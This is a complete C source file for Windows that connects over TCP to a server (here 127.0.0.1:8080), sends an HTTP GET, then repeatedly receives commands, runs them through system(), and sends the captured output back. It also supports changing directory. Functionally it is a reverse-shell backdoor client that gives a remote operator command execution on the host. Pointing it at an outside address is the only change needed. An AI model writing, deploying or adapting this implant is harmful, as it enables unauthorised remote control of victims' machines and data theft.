#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <direct.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 512
#define OUTPUT_BUFFER_SIZE 8192

int initialiseWinsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData);
}

SOCKET createSocket() {
    return socket(AF_INET, SOCK_STREAM, 0);
}

void defineServerAddress(struct sockaddr_in* serverAddr) {
    serverAddr->sin_family = AF_INET;
    serverAddr->sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr->sin_addr);  // Localhost
}

int connectToServer(SOCKET clientFd, struct sockaddr_in* serverAddr) {
    return connect(clientFd, (struct sockaddr*)serverAddr, sizeof(*serverAddr));
}

void sendGetRequest(SOCKET clientFd) {
    const char* getRequest = "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
    send(clientFd, getRequest, strlen(getRequest), 0);
}

void readHttpResponse(SOCKET clientFd) {
    char buffer[OUTPUT_BUFFER_SIZE];
    int bytesReceived = recv(clientFd, buffer, sizeof(buffer) - 1, 0);

    if (bytesReceived > 0) {
        buffer[bytesReceived] = '\0';
        printf("Server response:\n%s\n", buffer);
    }
}

void executeCommand(const char* command, char* output) {
    const char* tempFile = "temp_output.txt";
    char fullCommand[BUFFER_SIZE];

    snprintf(fullCommand, sizeof(fullCommand), "%s > %s 2>&1", command, tempFile);

    if (system(fullCommand) == -1) {
        strcpy_s(output, OUTPUT_BUFFER_SIZE, "Error executing command.\n");
        return;
    }

    FILE* file = fopen(tempFile, "r");
    if (!file) {
        strcpy_s(output, OUTPUT_BUFFER_SIZE, "Error reading output.\n");
        return;
    }

    output[0] = '\0';
    char buffer[OUTPUT_BUFFER_SIZE];

    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        strncat_s(output, OUTPUT_BUFFER_SIZE, buffer, _TRUNCATE);
    }

    fclose(file);
    remove(tempFile);  // Clean up temp file
}

int changeDirectory(const char* dir) {
    return _chdir(dir);
}

void clientLogic(SOCKET clientFd) {
    char currentDirectory[BUFFER_SIZE];
    _getcwd(currentDirectory, sizeof(currentDirectory));
    printf("Current dir: %s\n", currentDirectory);

    while (1) {
        char command[256];
        int bytesReceived = recv(clientFd, command, sizeof(command) - 1, 0);

        if (bytesReceived <= 0) {
            printf("Server disconnected.\n");
            break;
        }

        command[bytesReceived] = '\0';
        printf("Command from server: %s\n", command);

        // Handle directory change command
        if (strncmp(command, "cd ", 3) == 0) {
            char* newDir = command + 3;
            newDir[strcspn(newDir, "\n")] = 0;

            char originalDirectory[BUFFER_SIZE];
            _getcwd(originalDirectory, sizeof(originalDirectory));

            if (changeDirectory(newDir) == 0) {
                printf("Changed dir to: %s\n", newDir);
                _getcwd(currentDirectory, sizeof(currentDirectory));
                send(clientFd, currentDirectory, strlen(currentDirectory), 0);  // Notify server of new dir
            }
            else {
                printf("Couldn't change dir to: %s\n", newDir);
            }
            continue;
        }

        char output[OUTPUT_BUFFER_SIZE];
        executeCommand(command, output);

        if (strlen(output) == 0) {
            strcpy_s(output, OUTPUT_BUFFER_SIZE, "No output from the command.\n");
        }

        send(clientFd, output, strlen(output), 0);
    }
}

int main() {
    if (initialiseWinsock() != 0) {
        perror("WSAStartup failed");
        return EXIT_FAILURE;
    }

    SOCKET clientFd = createSocket();
    if (clientFd == INVALID_SOCKET) {
        perror("Socket creation failed");
        WSACleanup();
        return EXIT_FAILURE;
    }

    struct sockaddr_in serverAddr;
    defineServerAddress(&serverAddr);

    if (connectToServer(clientFd, &serverAddr) < 0) {
        perror("Connection to server failed");
        closesocket(clientFd);
        WSACleanup();
        return EXIT_FAILURE;
    }

    printf("Connected to server.\n");

    sendGetRequest(clientFd);
    readHttpResponse(clientFd);

    clientLogic(clientFd);

    closesocket(clientFd);
    WSACleanup();
    return 0;
}
